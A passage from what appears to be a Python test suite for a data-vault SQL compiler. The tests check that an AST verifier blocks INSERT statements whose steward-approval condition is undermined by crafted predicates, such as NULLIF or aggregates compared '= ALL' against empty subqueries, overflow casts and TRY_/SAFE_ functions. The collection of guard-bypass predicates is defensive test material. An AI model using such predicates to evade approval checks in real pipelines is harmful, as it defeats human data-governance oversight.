        "(SELECT ARG_MIN_NULL(NULL::VARCHAR, 1) OVER () FROM (SELECT 1) AS t) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT ARG_MIN_NULLS_LAST(NULL::VARCHAR, 1) OVER () FROM (SELECT 1) AS t) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT RESERVOIR_QUANTILE(NULL::DOUBLE, 0.5) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT APPROX_QUANTILE(NULL::DOUBLE, 0.5) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT HISTOGRAM(NULL::INT) OVER () FROM (SELECT 1) AS t) = ALL(SELECT MAP {1: 1::UBIGINT} WHERE FALSE)",
        "(SELECT GEOMEAN(NULL::DOUBLE) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "(SELECT MODE(NULL::INT) OVER () FROM (SELECT 1) AS t) = ALL(SELECT 1 WHERE FALSE)",
        # 6. _bool_expr_fold gaps & constant NULLIF fail-closed guard
        "NULLIF(REPLACE('abc', '', 'x'), 'abc') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(ROUND(1.005::DOUBLE, 2), 1.0) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(SUBSTR('abc', 0, 2), 'a') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(SUBSTR('abc', -1, 2), 'c') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(EXTRACT(YEAR FROM DATE '2026-01-01'), 2026) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(DATE_PART('year', DATE '2026-01-01'), 2026) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(SQRT(4), 2) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(POW(2, 3), 8) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(SIGN(-5), -1) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(ASCII('A'), 65) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(CHR(65), 'A') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(LENGTH('åäö'), 3) = ALL(SELECT 1 WHERE FALSE)",
    )
    for pred in live_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    dialect_blocked = (
        *(("duckdb_local", p) for p in live_preds),
        ("snowflake", "TRY_TO_DATE('bad', 'YYYY-MM-DD') = ALL(SELECT CURRENT_DATE() WHERE FALSE)"),
        ("snowflake", "TRY_TO_TIMESTAMP('bad', 'YYYY-MM-DD') = ALL(SELECT CURRENT_TIMESTAMP() WHERE FALSE)"),
        ("snowflake", "TRY_TO_NUMBER('bad') = ALL(SELECT 1 WHERE FALSE)"),
        ("snowflake", "TRY_TO_DECIMAL('bad', 10, 2) = ALL(SELECT 1.0 WHERE FALSE)"),
        ("snowflake", "CAST(TRY_TO_BOOLEAN('bad') AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)"),
        ("bigquery", "SAFE.PARSE_JSON('bad') = ALL(SELECT x FROM staging.empty_t)"),
    )
    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_sql, tid)
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    portable_preds = (
        "('a' LIKE 'a' ESCAPE NULL) = ALL(SELECT TRUE WHERE FALSE)",
        "('a' ILIKE 'a' ESCAPE NULL) = ALL(SELECT TRUE WHERE FALSE)",
        "CAST('a' LIKE 'a' ESCAPE NULL AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(2 = ANY(SELECT NULL::INT) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(1 = ALL(SELECT x FROM (VALUES (1), (NULL::INT)) AS t(x)) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "(SELECT PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY NULL::INT) FROM (SELECT 1) AS t) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(REPLACE('abc', '', 'x'), 'abc') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(SUBSTR('abc', 0, 2), 'a') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(SUBSTR('abc', -1, 2), 'c') = ALL(SELECT x FROM staging.empty_t)",
    )
    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for pred in portable_preds:
            u_sql = (
                "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
                f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
            )
            try:
                ast = sqlglot.parse_one(u_sql, read=dialect)
            except Exception:
                continue
            assert has_steward_approved_guard(ast) is False, (tid, pred)
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
            ), (tid, pred)

    # All 79 DuckDB catalog aggregates blocked on sat_* and in OVER () on NULL
    agg_rows = ddb.execute(
        "SELECT DISTINCT function_name FROM duckdb_functions() "
        "WHERE function_type = 'aggregate' ORDER BY 1"
    ).fetchall()
    assert len(agg_rows) == 79
    agg_args = {
        "approx_top_k": "NULL::INT, 1",
        "approx_quantile": "NULL::DOUBLE, 0.5",
        "arg_max": "NULL::DOUBLE, 1",
        "arg_max_null": "NULL::DOUBLE, 1",
        "arg_max_nulls_last": "NULL::DOUBLE, 1",
        "arg_min": "NULL::DOUBLE, 1",
        "arg_min_null": "NULL::DOUBLE, 1",
        "arg_min_nulls_last": "NULL::DOUBLE, 1",
        "argmax": "NULL::DOUBLE, 1",
        "argmin": "NULL::DOUBLE, 1",
        "bitstring_agg": "NULL::INT",
        "corr": "NULL::DOUBLE, 1.0",
        "covar_pop": "NULL::DOUBLE, 1.0",
        "covar_samp": "NULL::DOUBLE, 1.0",
        "decimal_average": "NULL::DECIMAL(10,2)",
        "histogram_exact": "NULL::INT, [1, 2]",
        "lttb": "NULL::DOUBLE, NULL::DOUBLE, 2",
        "max_by": "NULL::DOUBLE, 1",
        "min_by": "NULL::DOUBLE, 1",
        "quantile": "NULL::DOUBLE, 0.5",
        "quantile_cont": "NULL::DOUBLE, 0.5",
        "quantile_disc": "NULL::DOUBLE, 0.5",
        "regr_avgx": "NULL::DOUBLE, 1.0",
        "regr_avgy": "NULL::DOUBLE, 1.0",
        "regr_count": "NULL::DOUBLE, 1.0",
        "regr_intercept": "NULL::DOUBLE, 1.0",
        "regr_r2": "NULL::DOUBLE, 1.0",
        "regr_slope": "NULL::DOUBLE, 1.0",
        "regr_sxx": "NULL::DOUBLE, 1.0",
        "regr_sxy": "NULL::DOUBLE, 1.0",
        "regr_syy": "NULL::DOUBLE, 1.0",
        "reservoir_quantile": "NULL::DOUBLE, 0.5",
        "string_agg": "NULL::VARCHAR, ','",
        "group_concat": "NULL::VARCHAR, ','",
        "listagg": "NULL::VARCHAR, ','",
        "variant_group_object": "'a', NULL",
        "count_star": "",
        "combine_aggr": "NULL::DOUBLE",
    }
    for (fn,) in agg_rows:
        args = agg_args.get(fn, "NULL::DOUBLE")
        sat_args = (
            ""
            if fn == "count_star"
            else args.replace("NULL::DOUBLE", "s.id")
            .replace("NULL::INT", "s.id")
            .replace("NULL::VARCHAR", "s.hk")
            .replace("NULL::DECIMAL(10,2)", "s.id")
            .replace("NULL", "s.id")
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {fn}({sat_args}) = 1"
        )
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_sql, "duckdb_local")
        ), fn
        if fn not in (
            "count", "count_star", "regr_count", "array_agg", "list",
            "approx_count_distinct", "variant_group_object",
        ):
            over_ast = sqlglot.parse_one(f"(SELECT {fn}({args}) OVER () FROM (SELECT 1) AS t)", read="duckdb")
            assert is_bool_or_null_expr(over_ast) is True, fn

    valid_controls = (
        ("duckdb_local", "JSON_EXTRACT(JSON_EXTRACT('{\"A\": {\"B\": \"ok\"}}', '$.A'), '$.B')", "JSON_EXTRACT(JSON_EXTRACT('{\"A\": {\"B\": \"ok\"}}', '$.A'), '$.B') = ANY(s.arr)"),
        ("duckdb_local", "JSON_EXTRACT_STRING(JSON_EXTRACT('{\"outer\": {\"A\": \"ok\"}}', '$.outer'), '$.A')", "JSON_EXTRACT_STRING(JSON_EXTRACT('{\"outer\": {\"A\": \"ok\"}}', '$.outer'), '$.A') = ANY(s.arr)"),
        ("duckdb_local", "(JSON_EXTRACT('{\"A\": {\"B\": \"ok\"}}', '$.A')->>'B')", "(JSON_EXTRACT('{\"A\": {\"B\": \"ok\"}}', '$.A')->>'B') = ANY(s.arr)"),
        ("duckdb_local", "JSON_KEYS('{\"a\": 1}')[1]", "JSON_KEYS('{\"a\": 1}')[1] = ANY(s.arr)"),
        ("duckdb_local", "JSON_KEYS('{\"a\": 1}', '$')[1]", "JSON_KEYS('{\"a\": 1}', '$')[1] = ANY(s.arr)"),
        ("duckdb_local", "JSON_KEYS(JSON_OBJECT('a', 1))[1]", "JSON_KEYS(JSON_OBJECT('a', 1))[1] = ANY(s.arr)"),
        ("duckdb_local", "CAST(1 = ANY(ARRAY[1]) AS VARCHAR)", "CAST(1 = ANY(ARRAY[1]) AS VARCHAR) = ANY(ARRAY['true'])"),
        ("duckdb_local", "TRY_CAST(1e40 AS DOUBLE)", "TRY_CAST(1e40 AS DOUBLE) = ANY(ARRAY[1e40])"),
        ("duckdb_local", "NULLIF('a', 'b')", "NULLIF('a', 'b') = ANY(s.arr)"),
        ("duckdb_local", "NULLIF(UPPER('a'), 'b')", "NULLIF(UPPER('a'), 'b') = ANY(s.arr)"),
        ("duckdb_local", "NULLIF(s.hk, 'x')", "NULLIF(s.hk, 'x') = ANY(s.arr)"),
        ("duckdb_local", "NULLIF(SQRT(4), 3)", "NULLIF(SQRT(4), 3) = ANY(ARRAY[2.0])"),
        ("duckdb_local", "NULLIF(EXTRACT(YEAR FROM DATE '2026-01-01'), 2025)", "NULLIF(EXTRACT(YEAR FROM DATE '2026-01-01'), 2025) = ANY(ARRAY[2026])"),
        ("duckdb_local", "(SELECT PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY s.id) FROM staging.s AS s)", "(SELECT PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY s.id) FROM staging.s AS s) = ANY(ARRAY[2.0])"),
    )
    for _, ctrl_expr, _ in valid_controls:
        assert ddb.execute(f"SELECT {ctrl_expr} FROM staging.s AS s").fetchone()[0] is not None, (
            ctrl_expr
        )
    ddb.close()

    for ok_tid, _, ok_pred in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, ok_pred
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], ok_pred
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], ok_pred

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []




def test_iter39_r6_overflow_float32_tz_round_map_nullif_safe_try() -> None:
    """Remediate all 6 converged r6 items with 0 FPs across controls and 80/80 bundles."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, "
        "b BOOLEAN[], arr VARCHAR[], m MAP(VARCHAR, VARCHAR))"
    )
    ddb.execute(
        "INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'], MAP {'a': 'ok'})"
    )
    ddb.execute("CREATE TABLE staging.empty_t (x VARCHAR)")

    big400 = "1" + ("0" * 400)
    live_preds = (
        # 1. Big-int OverflowError guards (no crash + blocked)
        "NULLIF(POW(10000, 100), 1) = ALL(SELECT 1 WHERE FALSE)",
        f"TRY_CAST({big400} AS DOUBLE) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(ABS(POW(10000, 100)), 1) = ALL(SELECT 1 WHERE FALSE)",
        # 2. Binary32 FLOAT/REAL precision & POW >= 2^53
        "NULLIF(TRY_CAST(1e-50 AS FLOAT), 0.0) = ALL(SELECT 1.0::FLOAT WHERE FALSE)",
        "NULLIF(TRY_CAST(1.00000001 AS FLOAT), 1.0) = ALL(SELECT 1.0::FLOAT WHERE FALSE)",
        "NULLIF(CAST(1e-50 AS FLOAT), 0.0) = ALL(SELECT 1.0::FLOAT WHERE FALSE)",
        "NULLIF(CAST(1.00000001 AS REAL), 1.0::REAL) = ALL(SELECT 1.0::REAL WHERE FALSE)",
        "NULLIF(CAST(123456789 AS FLOAT), 123456792.0) = ALL(SELECT 1.0::FLOAT WHERE FALSE)",
        "NULLIF(CAST(-123456789 AS FLOAT), -123456792.0) = ALL(SELECT 1.0::FLOAT WHERE FALSE)",
        "NULLIF(TRY_CAST(123456789 AS REAL), 123456792.0) = ALL(SELECT 1.0::REAL WHERE FALSE)",
        "NULLIF(CAST(0.1 AS FLOAT), 0.10000000149011612) = ALL(SELECT 1.0::FLOAT WHERE FALSE)",
        "NULLIF(CAST(1e-46 AS FLOAT), 0.0) = ALL(SELECT 1.0::FLOAT WHERE FALSE)",
        "NULLIF(POW(3, 40), 12157665459056928768.0) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(POW(2, 60) + 1, 1152921504606846976.0) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(POW(2, 53) + 1, 9007199254740992.0) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(POW(5, 30), 9.313225746154785e+20) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(POW(7, 25), 1.3410686196639649e+21) = ALL(SELECT 1.0 WHERE FALSE)",
        # 3. TIMESTAMPTZ EXTRACT/DATE_PART, ROUND dv<0, non-ASCII UPPER/LOWER/REVERSE
        "NULLIF(EXTRACT(HOUR FROM TIMESTAMPTZ '2026-01-01 23:00:00+02:00'), "
        "EXTRACT(HOUR FROM TIMESTAMPTZ '2026-01-01 23:00:00+02:00')) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(DATE_PART('hour', CAST('2024-01-15T00:00:00+05:00' AS TIMESTAMPTZ)), "
        "DATE_PART('hour', CAST('2024-01-15T00:00:00+05:00' AS TIMESTAMPTZ))) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(ROUND(25, -1), 20) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(UPPER('ß'), 'ẞ') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(LOWER('İ'), 'i') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(REVERSE('a\u0301b'), 'ba\u0301') = ALL(SELECT x FROM staging.empty_t)",
        # 4. Dynamic JSON_OBJECT/MAP keys & duplicate JSON_OBJECT keys
        "JSON_EXTRACT(JSON_OBJECT(s.hk, 'ok'), '$.a') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT(JSON_OBJECT(UPPER('k'), 'ok'), '$.a') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT(JSON_EXTRACT(JSON_OBJECT('A', JSON_OBJECT(s.hk, 'ok')), '$.A'), '$.a') = ALL(SELECT x FROM staging.empty_t)",
        "MAP(ARRAY['a', s.hk], ARRAY['x', 'y'])['b'] = ALL(SELECT x FROM staging.empty_t)",
        # 5. Constant non-empty Select inside NULLIF
        "NULLIF('a', (SELECT 'a' WHERE 1=1)) = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF('a', (SELECT DISTINCT 'a')) = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF('a', (SELECT 'a' LIMIT 1)) = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF('a', (SELECT 'a' GROUP BY 1)) = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF((SELECT x FROM (VALUES (1), (2)) AS t(x) LIMIT 1), 1) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT 1) + (SELECT 0 LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
    )
    for pred in live_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    multi_branch_cte = (
        "INSERT INTO raw_vault.lnk_u (hk_u) "
        "WITH c AS ("
        "  SELECT s.hk, s.steward_gate_status, 1 AS x FROM staging.s AS s "
        "  UNION ALL "
        "  SELECT s.hk, s.steward_gate_status, 2 AS x FROM staging.s AS s"
        ") "
        "SELECT c.hk FROM c "
        "WHERE c.steward_gate_status = 'APPROVED' AND NULLIF(c.x, 1) = ALL(SELECT 1 WHERE FALSE)"
    )
    assert ddb.execute(
        "WITH c AS (SELECT 'k1' AS hk, 'APPROVED' AS steward_gate_status, 1 AS x "
        "UNION ALL SELECT 'k1', 'APPROVED', 2) "
        "SELECT COUNT(*), SUM(CASE WHEN NULLIF(c.x, 1) IS NULL THEN 1 ELSE 0 END) "
        "FROM c WHERE c.steward_gate_status = 'APPROVED' "
        "AND NULLIF(c.x, 1) = ALL(SELECT 1 WHERE FALSE)"
    ).fetchone() == (2, 1)
    assert has_steward_approved_guard(sqlglot.parse_one(multi_branch_cte, read="duckdb")) is False
    assert any(
        d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
        for d in verifier.verify_sql(multi_branch_cte, "duckdb_local", extra_unstructured_links=["lnk_u"])
    )

    dialect_blocked = (
        *(("duckdb_local", p) for p in live_preds),
        ("duckdb_local", f"NULLIF(ROUND({big400}, 0), 1) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", f"NULLIF(SQRT({big400}), 1) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", f"NULLIF(FLOOR({big400}), 1) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", f"NULLIF(SIGN({big400}), 1) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", "NULLIF(EXTRACT(HOUR FROM TIMESTAMPTZ '2026-01-01 23:00:00+02:00'), 21) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", "NULLIF(EXTRACT(DAY FROM TIMESTAMPTZ '2026-01-02 01:00:00+02:00'), 1) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", "NULLIF(DATE_PART('hour', CAST('2024-01-15T00:00:00+05:00' AS TIMESTAMPTZ)), 3) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", "JSON_KEYS(JSON_OBJECT('a', 1, 'a', 2))[2] = ALL(SELECT x FROM staging.empty_t)"),
        ("clickhouse", "NULLIF(ROUND(2.5, 0), 2) = ALL(SELECT 1 WHERE FALSE)"),
        ("snowflake", "TRY_HEX_DECODE_STRING('zz') = ALL(SELECT x FROM staging.empty_t)"),
        ("snowflake", "TRY_HEX_DECODE_BINARY('zz') = ALL(SELECT x FROM staging.empty_t)"),
        ("snowflake", "TRY_BASE64_DECODE_STRING('!bad!') = ALL(SELECT x FROM staging.empty_t)"),
        ("snowflake", "TRY_BASE64_DECODE_BINARY('!bad!') = ALL(SELECT x FROM staging.empty_t)"),
        ("snowflake", "TRY_TO_DECFLOAT('bad') = ALL(SELECT 1 WHERE FALSE)"),
        ("snowflake", "TRY_TO_BINARY('zz', 'hex') = ALL(SELECT x FROM staging.empty_t)"),
        ("snowflake", "OBJECT_KEYS(PARSE_JSON('[1, 2]'))[0] = ALL(SELECT x FROM staging.empty_t)"),
        ("databricks_uc", "TRY_DIVIDE(1, 0) = ALL(SELECT 1.0 WHERE FALSE)"),
        ("databricks_uc", "TRY_ADD(2147483647, 1) = ALL(SELECT 1 WHERE FALSE)"),
        ("databricks_uc", "TRY_SUBTRACT(-9223372036854775808, 1) = ALL(SELECT 1 WHERE FALSE)"),
        ("databricks_uc", "TRY_MULTIPLY(9223372036854775807, 2) = ALL(SELECT 1 WHERE FALSE)"),
        ("databricks_uc", "TRY_TO_BINARY('zz', 'hex') = ALL(SELECT x FROM staging.empty_t)"),
        ("bigquery", "SAFE.SUBSTR('abc', 1, 1) = ALL(SELECT x FROM staging.empty_t)"),
        ("bigquery", "SAFE_ADD(1, 2) = ALL(SELECT 1 WHERE FALSE)"),
        ("bigquery", "SAFE_DIVIDE(1, 0) = ALL(SELECT 1.0 WHERE FALSE)"),
        ("bigquery", "SAFE_NEGATE(1) = ALL(SELECT 1 WHERE FALSE)"),
        ("bigquery", "SAFE_CONVERT_BYTES_TO_STRING(b'abc') = ALL(SELECT x FROM staging.empty_t)"),
    )
    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    assert is_bool_or_null_expr(sqlglot.parse_one("NULLIF(ROUND(1.005::DOUBLE, 2), 1.0)", read="duckdb")) is True

    valid_controls = (
        ("duckdb_local", "TRY_CAST(1e40 AS DOUBLE)", "TRY_CAST(1e40 AS DOUBLE) = ANY(ARRAY[1e40])"),
        ("duckdb_local", "TRY_CAST('1.5' AS DOUBLE)", "TRY_CAST('1.5' AS DOUBLE) = ANY(ARRAY[1.5])"),
        ("duckdb_local", "TRY_CAST(1.5 AS FLOAT)", "TRY_CAST(1.5 AS FLOAT) = ANY(ARRAY[1.5::FLOAT])"),
        ("duckdb_local", "ROUND(1.2, 0)", "ROUND(1.2, 0) = ANY(ARRAY[1.0])"),
        ("duckdb_local", "NULLIF('ok', (SELECT 'ok' LIMIT 0))", "NULLIF('ok', (SELECT 'ok' LIMIT 0)) = ANY(s.arr)"),
        ("duckdb_local", "NULLIF('ok', (SELECT 'ok' OFFSET 1))", "NULLIF('ok', (SELECT 'ok' OFFSET 1)) = ANY(s.arr)"),
        ("duckdb_local", "NULLIF('ok', (SELECT 'ok' WHERE FALSE))", "NULLIF('ok', (SELECT 'ok' WHERE FALSE)) = ANY(s.arr)"),
        ("duckdb_local", "NULLIF(s.hk, 'x')", "NULLIF(s.hk, 'x') = ANY(s.arr)"),
        ("duckdb_local", "NULLIF('a', 'b')", "NULLIF('a', 'b') = ANY(s.arr)"),
        ("duckdb_local", "NULLIF(UPPER('a'), 'b')", "NULLIF(UPPER('a'), 'b') = ANY(s.arr)"),
        ("duckdb_local", "JSON_KEYS(JSON_OBJECT('a', 1))[1]", "JSON_KEYS(JSON_OBJECT('a', 1))[1] = ANY(s.arr)"),
        ("snowflake", None, "CAST(TRY_TO_BOOLEAN('true') AS VARCHAR) = ANY(ARRAY['true'])"),
        ("snowflake", None, "CONCAT_WS(',', NULL, 'b') = 'b'"),
        ("snowflake", None, "OBJECT_KEYS(PARSE_JSON('{\"a\": 1}'))[0] = ANY(ARRAY['a'])"),
    )
    for ok_tid, ctrl_expr, ok_pred in valid_controls:
        if ctrl_expr is not None:
            assert ddb.execute(f"SELECT {ctrl_expr} FROM staging.s AS s").fetchone()[0] is not None, (
                ctrl_expr
            )
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)
    ddb.close()

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []




def test_iter40_r7_overflow_floor_cte_double_try_bool_json_numstr() -> None:
    """Remediate all 8 converged r7 items with 0 FPs across controls and 80/80 bundles."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, "
        "b BOOLEAN[], arr VARCHAR[])"
    )
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'])")
    ddb.execute("CREATE TABLE staging.empty_t (x VARCHAR)")
    ddb.execute("CREATE TABLE staging.empty_j (x JSON)")

    live_preds = (
        # 2. FLOOR/CEIL/ROUND on float >= 2^53
        "NULLIF(FLOOR(1e20) + 1, 1e20) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(CEIL(1e20) + 1, 1e20) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(FLOOR(1e20::DOUBLE) + 1, 1e20::DOUBLE) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(CEIL(1e20::DOUBLE) + 1, 1e20::DOUBLE) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF(ROUND(CAST(9007199254740992 AS DOUBLE), 0) + 1, 9007199254740992.0) = ALL(SELECT 1.0 WHERE FALSE)",
        # 3. CTE columns & implicit VALUES columns inside NULLIF
        "NULLIF(1, (WITH c AS (SELECT 1 AS x) SELECT x FROM c WHERE 1=1)) = ALL(SELECT 1 WHERE FALSE)",
